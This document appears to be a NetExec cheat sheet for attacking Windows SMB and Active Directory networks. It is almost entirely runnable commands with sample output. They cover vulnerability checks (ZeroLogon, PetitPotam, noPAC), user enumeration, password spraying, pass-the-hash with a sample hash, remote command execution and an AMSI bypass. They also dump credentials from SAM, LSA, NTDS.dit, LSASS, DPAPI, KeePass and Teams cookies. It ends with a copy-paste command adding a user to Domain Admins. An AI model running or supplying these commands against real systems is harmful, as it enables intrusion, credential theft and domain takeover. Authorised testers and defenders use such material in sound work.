## Scan for Vulnerabilities
```
These are a few modules you should try early:

ZeroLogon
nxc smb <ip> -u '' -p '' -M zerologon

PetitPotam
nxc smb <ip> -u '' -p '' -M petitpotam

noPAC
nxc smb <ip> -u 'user' -p 'pass' -M nopac <- You need a credential for this one

Or, try them all at once! Just list each one: -M zerologon -M petitpotam
Check out what other modules are available via nxc <protocol> -L
```

## Enumeration 
```
Map Network Hosts
Returns a list of live hosts:
nxc smb 192.168.1.0/24

Expected Results:
SMB         192.168.1.101    445    DC2012A          [*] Windows Server 2012 R2 Standard 9600 x64 (name:DC2012A) (domain:OCEAN) (signing:True) (SMBv1:True)
SMB         192.168.1.102    445    DC2012B          [*] Windows Server 2012 R2 Standard 9600 x64 (name:DC2012B) (domain:EARTH) (signing:True) (SMBv1:True)
SMB         192.168.1.110    445    DC2016A          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:DC2016A) (domain:OCEAN) (signing:True) (SMBv1:True)
SMB         192.168.1.117    445    WIN10DESK1       [*] WIN10DESK1 x64 (name:WIN10DESK1) (domain:OCEAN) (signing:False) (SMBv1:True)
```

## Enumerate Null Sessions
```
Checking if Null Session is enabled on the network, can be very useful on a Domain Controller to enumerate users, groups, password policy etc
nxc smb 10.10.10.161 -u '' -p ''
nxc smb 10.10.10.161 --pass-pol
nxc smb 10.10.10.161 --users
nxc smb 10.10.10.161 --groups

You can also reproduce this behavior with smbclient or rpcclient:
smbclient -N -U "" -L \\10.10.10.161
rpcclient -N -U "" -L \\10.10.10.161
rpcclient $> enumdomusers
user:[bonclay] rid:[0x46e]
user:[zoro] rid:[0x46f]

Example
Forest or Monteverde machines are good HTB examples to test null session authentication with NetExec.
```

## Enumerate Anonymous Logon
```
Using a random username and password you can check if the target accepts annonymous/guest logon.
Make sure the password is empty:
nxc smb 10.10.10.178 -u 'a' -p ''

You can also check this behavior with smbclient or rpcclient:
smbclient -N -L \\10.10.10.178
rpcclient -N -L 10.10.10.178

Nest machine is a good HTB example of anonymous logon with NetExec.
``` 

## Enumerate Hosts with SMB Signing Not Required
```
Maps the network of live hosts and saves a list of only the hosts that don't require SMB signing.
List format is one IP per line:
nxc smb 192.168.1.0/24 --gen-relay-list relay_list.txt

Expected Results:
SMB         192.168.1.101    445    DC2012A          [*] Windows Server 2012 R2 Standard 9600 x64 (name:DC2012A) (domain:OCEAN) (signing:True) (SMBv1:True)
SMB         192.168.1.102    445    DC2012B          [*] Windows Server 2012 R2 Standard 9600 x64 (name:DC2012B) (domain:EARTH) (signing:True) (SMBv1:True)
SMB         192.168.1.111    445    SERVER1          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:SERVER1) (domain:PACIFIC) (signing:False) (SMBv1:True)
SMB         192.168.1.117    445    WIN10DESK1       [*] WIN10DESK1 x64 (name:WIN10DESK1) (domain:OCEAN) (signing:False) (SMBv1:True)
...SNIP...

#~ cat relay_list.txt
192.168.1.111
192.168.1.117

Alternative with nmap
You can also list only the hosts that don't require SMB signing using nmap:
nmap --script smb-security-mode.nse,smb2-security-mode.nse -p445 127.0.0.1
```

## Enumerate Active Sessions
```
Enumerate active sessions on the remote target:
nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sessions
```

## Enumerate Shares and Access
```
Enumerate permissions on all shares:
nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --shares

If you want to filter only by readable or writable share:
#~ nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --shares --filter-shares READ WRITE
```

## Enumerate Disks
```
Enumerate disks on the remote target:
nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --disks
```

## Enumerate Logged on Users
```
Enumerate logged users on the remote target:
nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --loggedon-users
```

## Enumerate Domain Users
```
Enumerate domain users on the remote target:
nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --users
```

## Enumerate Users by Bruteforcing RID
```
Enumerate users by bruteforcing the RID on the remote target:
nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --rid-brute
```

## Enumerate Domain Groups
```
Enumerate domain groups on the remote target:
nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --groups
```

## Enumerate Local Groups
```
Enumerate local groups on the remote target:
nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' s --local-group
```

## Enumerate Domain Password Policy
```
Using the option --pass-pol you can get the password policy of the domain:
nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --pass-pol
```

## Enumerate Anti-Virus & EDR (new!)
```
Enumerate antivirus installed using NetExec.
You don't need to be a privileged user to do this action.
nxc smb <ip> -u user -p pass -M enum_av
```

## Password Spraying
```
Using NetExec for password spraying.
Using Username/Password Lists.

You can try multiple usernames or passwords by seperating the names/passwords with a space:

nxc smb 192.168.1.101 -u user1 user2 user3 -p Summer18
nxc smb 192.168.1.101 -u user1 -p password1 password2 password3

nxc accepts txt files of usernames and passwords. One user/password per line. Watch out for account lockout!:

nxc smb 192.168.1.101 -u /path/to/users.txt -p Summer18
nxc smb 192.168.1.101 -u Administrator -p /path/to/passwords.txt

By default nxc will exit after a successful login is found.
Using the --continue-on-success flag will continue spraying even after a valid password is found.
Usefull for spraying a single password against a large user list Usage example:

nxc smb 192.168.1.101 -u /path/to/users.txt -p Summer18 --continue-on-success
```

## Checking 'username == password' using wordlist
```
nxc smb 192.168.1.101 -u user.txt -p user.txt --no-bruteforce --continue-on-success
```

## Checking multiple usernames/passwords using wordlist
```
nxc smb 192.168.1.101 -u user.txt -p password.txt

The result will be:
user1 => password1
user1 => password2
user2 => password1
user2 => password2
```

## Authentication
```
You can authenticate on the remote target using a domain account or a local user.
When authentication fail => COLOR RED
When authentication success => COLOR GREEN
When authentication fail but the password provided is valid => COLOR MAGENTA

Failed logins result in a [-]
Successful logins result in a [+] Domain\Username:Password

Local admin access results in a (Pwn3d!) added after the login confirmation, shown below.
SMB         192.168.1.101    445    HOSTNAME          [+] DOMAIN\Username:Password (Pwn3d!)

The following checks will attempt authentication to the entire /24 though a single target may also be used.

User/Password
#~ nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE'

User/Hash
After obtaining credentials such as
Administrator:500:aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c:::
you can use both the full hash or just the nt hash (second half)

#~ nxc smb 192.168.1.0/24 -u UserNAme -H 'LM:NT'
#~ nxc smb 192.168.1.0/24 -u UserNAme -H 'NTHASH'
#~ nxc smb 192.168.1.0/24 -u Administrator -H '13b29964cc2480b4ef454c59562e675c'
#~ nxc smb 192.168.1.0/24 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c'
```

## Checking Credentials (Local)
```
User/Password/Hashes
Adding --local-auth to any of the authentication commands with attempt to logon locally.
#~ nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --local-auth
#~ nxc smb 192.168.1.0/24 -u '' -p '' --local-auth
#~ nxc smb 192.168.1.0/24 -u UserNAme -H 'LM:NT' --local-auth
#~ nxc smb 192.168.1.0/24 -u UserNAme -H 'NTHASH' --local-auth
#~ nxc smb 192.168.1.0/24 -u localguy -H '13b29964cc2480b4ef454c59562e675c' --local-auth
#~ nxc smb 192.168.1.0/24 -u localguy -H 'aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c' --local-auth

Results will display the hostname next to the user:password:
SMB         192.168.1.101    445    HOSTNAME          [+] HOSTNAME\Username:Password (Pwn3d!)
```

## Command Execution - Executing Remote Commands
```
Executing Remote Commands
Executing commands on a windows system requires Administrator credentials.
nxc automatically tells you if the credential set you're using has admin access to a host by appending "(Pwn3d!)" (or whatever value you've set in the config) to the output when authentication is successful.
```

## Execution Methods
```
nxc has three different command execution methods:
wmiexec executes commands via WMI
atexec executes commands by scheduling a task with windows task scheduler
smbexec executes commands by creating and running a service

By default nxc will fail over to a different execution method if one fails. It attempts to execute commands in the following order:
1. wmiexec
2. atexec
3. smbexec

If you want to force nxc to use only one execution method you can specify which one using the --exec-method flag.
```

## Executing Commands
```
In the following example, we try to execute whoami on the target using the -x flag:
nxc 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami
06-05-2016 14:34:35 nxc          192.168.10.11:445 WIN7BOX         [*] Windows 6.1 Build 7601 (name:WIN7BOX) (domain:LAB)
06-05-2016 14:34:35 nxc          192.168.10.11:445 WIN7BOX         [+] LAB\Administrator:P@ssw0rd (Pwn3d!)
06-05-2016 14:34:39 nxc          192.168.10.11:445 WIN7BOX         [+] Executed command 
06-05-2016 14:34:39 nxc          192.168.10.11:445 WIN7BOX         lab\administrator
06-05-2016 14:34:39 [*] KTHXBYE!

You can also directly execute PowerShell commands using the -X flag:
nxc 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable'
06-05-2016 14:36:06 nxc          192.168.10.11:445 WIN7BOX         [*] Windows 6.1 Build 7601 (name:WIN7BOX) (domain:LAB)
06-05-2016 14:36:06 nxc          192.168.10.11:445 WIN7BOX         [+] LAB\Administrator:P@ssw0rd (Pwn3d!)
06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         [+] Executed command 
06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         Name                           Value
06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         ----                           -----
06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         CLRVersion                     2.0.50727.5420
06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         BuildVersion                   6.1.7601.17514
06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         PSVersion                      2.0
06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         WSManStackVersion              2.0
06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         PSCompatibleVersions           {1.0, 2.0}
06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         SerializationVersion           1.1.0.1
06-05-2016 14:36:10 nxc          192.168.10.11:445 WIN7BOX         PSRemotingProtocolVersion      2.1
06-05-2016 14:36:10 [*] KTHXBYE!
```

## Bypass AMSI
```
nxc 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable'  --amsi-bypass /path/payload
```

## Get and Put Files
```
Get a remote file or send a remote file using NetExec

Send a local file to the remote target:
nxc smb 172.16.251.152 -u user -p pass --put-file /tmp/whoami.txt \\Windows\\Temp\\whoami.txt

Get a remote file on the remote target:
nxc smb 172.16.251.152 -u user -p pass --get-file  \\Windows\\Temp\\whoami.txt /tmp/whoami.txt
```

## Spidering Shares
```
Spidering shares with NetExec
Using Default Option --spider

Options for spidering shares of remote systems. Example, Spider the C drive for files with txt in the name (finds both sometxtfile.html and somefile.txt)
Notice the '$' character has to be escaped. (example shown can be used as-is in a kali linux terminal)
nxc SMB <IP> -u USER -p PASSWORD --spider C\$ --pattern txt

Using Module "spider_plus"
The module spider_plus allows you to list and dump all files from all readable shares.

List all readable files:
nxc smb 10.10.10.10 -u 'user' -p 'pass' -M spider_plus

Dumping All Files:
Using the option -o DOWNLOAD_FLAG=True all files will be copied on the host
nxc smb 10.10.10.10 -u 'user' -p 'pass' -M spider_plus -o DOWNLOAD_FLAG=True
```

## Obtaining Credentials
```
The following examples use a username and plaintext password although user/hash combos work as well.
```

## Dump SAM
```
Dump SAM hashes using methods from secretsdump.py
You need at least local admin privilege on the remote target, use option --local-auth if your user is a local account
#~ nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

## Dump LSA
```
Dump LSA secrets using methods from secretsdump.py
Requires Domain Admin or Local Admin Priviledges on target Domain Controller.
#~ nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa

If you found an account starting with SC_GMSA{84A78B8C-56EE-465b-8496-FFB35A1B52A7} you can get the account behind:

Extract gMSA Secrets
Convert gSAM id, convert gmsa lsa to ntlm ...
NetExec offer multiple choices when you found a gmsa account in the LSA

nxc ldap <ip> -u <user> -p <pass> --gmsa-convert-id 313e25a880eb773502f03ad5021f49c2eb5b5be2a09f9883ae0d83308dbfa724
nxc ldap <ip> -u <user> -p <pass> --gmsa-decrypt-lsa '_SC_GMSA_{84A78B8C-56EE-465b-8496-FFB35A1B52A7}_313e25a880eb773502f03ad5021f49c2eb5b5be2a09f9883ae0d83308dbfa724:01000000240200001000120114021c02fbb096d10991bb88c3f54e153807b4c1cc009d30bc3c50fd6f72c99a1e79f27bd0cbd4df69fdf08b5cf6fa7928cf6924cf55bfd8dd505b1da26ddf5695f5333dd07d08673029b01082e548e31f1ad16c67db0116c6ab0f8d2a0f6f36ff30b160b7c78502d5df93232f72d6397b44571d1939a2d18bb9c28a5a48266f52737c934669e038e22d3ba5a7ae63a608f3074c520201f372d740fddec77a8fed4ddfc5b63ce7c4643b60a8c4c739e0d0c7078dd0c2fcbc2849e561ea2de1af7a004b462b1ff62ab4d3db5945a6227a58ed24461a634b85f939eeed392cf3fe9359f28f3daa8cb74edb9eef7dd38f44ed99fa7df5d10ea1545994012850980a7b3becba0000d22d957218fb7297b216e2d7272a4901f65c93ee0dbc4891d4eba49dda5354b0f2c359f185e6bb943da9bcfbd2abda591299cf166c28cb36907d1ba1a8956004b5e872ef851810689cec9578baae261b45d29d99aef743f3d9dcfbc5f89172c9761c706ea3ef16f4b553db628010e627dd42e3717208da1a2902636d63dabf1526597d94307c6b70a5acaf4bb2a1bdab05e38eb2594018e3ffac0245fcdb6afc5a36a5f98f5910491e85669f45d02e230cb633a4e64368205ac6fc3b0ba62d516283623670b723f906c2b3d40027791ab2ae97a8c5c135aae85da54a970e77fb46087d0e2233d062dcd88f866c12160313f9e6884b510840e90f4c5ee5a032d40000f0650a4489170000f0073a9188170000'
```

## Dump NTDS.dit
```
Dump the NTDS.dit from target DC using methods from secretsdump.py
Requires Domain Admin or Local Admin Priviledges on target Domain Controller.

2 methods are available:   
(default) 	drsuapi -  Uses drsuapi RPC interface create a handle, trigger replication, and combined with   
						additional drsuapi calls to convert the resultant linked-lists into readable format  
			      vss - Uses the Volume Shadow copy Service

#~ nxc smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ nxc smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds --users
#~ nxc smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds --users --enabled
#~ nxc smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss

You can also DCSYNC with the computer account of the DC.

There is also the ntdsutil module that will use ntdsutil to dump NTDS.dit and SYSTEM hive and parse them locally with secretsdump.py
#~ nxc smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' -M ntdsutil
```

## Dump LSASS
```
You need at least local admin privilege on the remote target, use option --local-auth if your user is a local account

Using Lsassy
Using the module Lsassy you can dump remotely the credentials:

#~ nxc smb 192.168.255.131 -u administrator -p pass -M lsassy

Using nanodump
Using the module nanodump you can dump remotely the credentials
#~ nxc smb 192.168.255.131 -u administrator -p pass -M nanodump
```

## Dump WIFI password
```
Get the WIFI password register in Windows
You need at least local admin privilege on the remote target, use option --local-auth if your user is a local account
nxc smb <ip> -u user -p pass -M wireless
```

## Dump KeePass
```
You can check if keepass is installed on the target computer and then steal the master password and decrypt the database!

$ NetExec smb <ip> -u user -p pass -M keepass_discover
$ NetExec smb <ip> -u user -p pass -M keepass_trigger -o KEEPASS_CONFIG_PATH="path_from_module_discovery"

https://web.archive.org/web/20211017083926/http://www.harmj0y.net:80/blog/redteaming/keethief-a-case-study-in-attacking-keepass-part-2
```

## Dump DPAPI (new!)
```
Dump DPAPI credentials using NetExec.
You can dump DPAPI credentials using NetExec using the following option --dpapi.
It will get all secrets from Credential Manager, Chrome, Edge, Firefox. --dpapi support options:
cookies : Collect every cookies in browsers
nosystem : Won't collect system credentials. This will prevent EDR from stopping you from looting passwords 
You need at least local admin privilege on the remote target, use option --local-auth if your user is a local account

$ nxc smb <ip> -u user -p password --dpapi
$ nxc smb <ip> -u user -p password --dpapi cookies
$ nxc smb <ip> -u user -p password --dpapi nosystem 
```

## Defeating LAPS (new!)
```
Using NetExec When LAPS Installed on the Domain.
If LAPS is used inside the domain, it can be hard to use NetExec to execute a command on every computer on the domain.
Therefore, a new core option has been added --laps ! If you have compromised an accout that can read LAPS password you can use NetExec like this:

nxc smb <ip> -u user-can-read-laps -p pass --laps

If the default administrator name is not administrator add the user after the option
--laps name
```

## Checking for Spooler and WEBDAV
```
Checking if the Spooler Service is Running:
nxc smb <ip> -u 'user' -p 'pass' -M spooler

Checking if the WebDav Service is Running:
nxc smb <ip> -u 'user' -p 'pass' -M webdav
```

## Steal Microsoft Teams Cookies
```
You need at least local admin privilege on the remote target.
New NetExec module to dump Microsoft Teams cookies.
You can use them to retrieve information like users, messages, groups etc or send directly messages in Teams.
$ nxc smb <ip> -u user -p pass -M teams_localdb
```

## Impersonate logged-on Users
```
Use Sessions from logged-on Users to execute arbitrary commands using schtask_as
You need at least local admin privilege on the remote target.
The Module schtask_as can execute commands on behalf on other users which has sessions on the target.

1. Enumerate logged-on users on your Target
nxc smb <ip> -u <localAdmin> -p <password> --loggedon-users

2. Execute commands on behalf of other users
nxc smb <ip> -u <localAdmin> -p <password> -M schtask_as -o USER=<logged-on-user> CMD=<cmd-command>

Custom command to add an user to the domain admin group for easy copy&pasting: 
powershell.exe \"Invoke-Command -ComputerName DC01 -ScriptBlock {Add-ADGroupMember -Identity 'Domain Admins' -Members USER.NAME}\"
```

































